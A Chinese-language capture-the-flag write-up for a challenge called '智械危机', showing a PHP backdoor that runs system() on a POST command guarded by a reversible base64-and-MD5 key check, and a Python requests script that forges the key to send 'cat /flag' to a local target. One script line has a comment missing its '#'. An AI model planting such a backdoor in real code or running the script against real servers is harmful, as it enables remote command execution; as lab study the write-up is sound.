1.智械危机
源代码
```plain
 <?php

function execute_cmd($cmd) {
    system($cmd);
}

function decrypt_request($cmd, $key) {
    $decoded_key = base64_decode($key);
    $reversed_cmd = '';
    for ($i = strlen($cmd) - 1; $i >= 0; $i--) {
        $reversed_cmd .= $cmd[$i];
    }
    $hashed_reversed_cmd = md5($reversed_cmd);
    if ($hashed_reversed_cmd !== $decoded_key ) {
        die("Invalid key");
    }
    $decrypted_cmd = base64_decode($cmd);
    return $decrypted_cmd;
}

if (isset($_POST['cmd']) && isset($_POST['key'])) {
    execute_cmd(decrypt_request($_POST['cmd'],$_POST['key']));
}
else {
    highlight_file(__FILE__);
}
?> 
```
pyload： 看到system想到cmd应该是cat /flag，先执行decrypt_request，在执行execute_cmd函数，首先把cmd用base64进行加密，因为base64.b64encode只能接受一个字节序列，所以先将使用cmd.encode()转换成字节序列，通过base64.b64encode转换成base64编码的字节序列，然后用encode转换成base64编码的字符串，要让$hashed_reversed_cmd !== $decoded_key，必须先得到hashed_reversed_cmd，然后在让hashed_reversed_cmd进行base64加密，所以先把cmd_encode反转得到reverse，对reverse进行hash加密得到hashed_reversed_cmd，对hashed_reversed_cmd进行base64加密得到decode_key的值，这样一来两个就可以相等
使用python的request传入参数 cmd: cmd_encode,key:decode_key ，reponse=requests.post(url,data=pyload)
flag=reponse.text
脚本
```plain
import requests 
import base64
import hashlib

url="http://127.0.0.1:57357/backd0or.php"
cmd="cat /flag"
cmd_encode=base64.b64encode(cmd.encode()).decode()#得到字节序列
cmd_reverse=cmd_encode[::-1]#反转字节序列
cmd_hashed_reversed=hashlib.md5(cmd_reverse.encode()).hexdigest()#得到md5值
cmd_decode_key=base64.b64encode(cmd_hashed_reversed.encode()).decode()得到加密后的md5，即key
pyload={
      'cmd':cmd_encode,
      'key':cmd_decode_key
 }
response=requests.post(url,data=pyload)
print("flag=",response.text)
```
2.
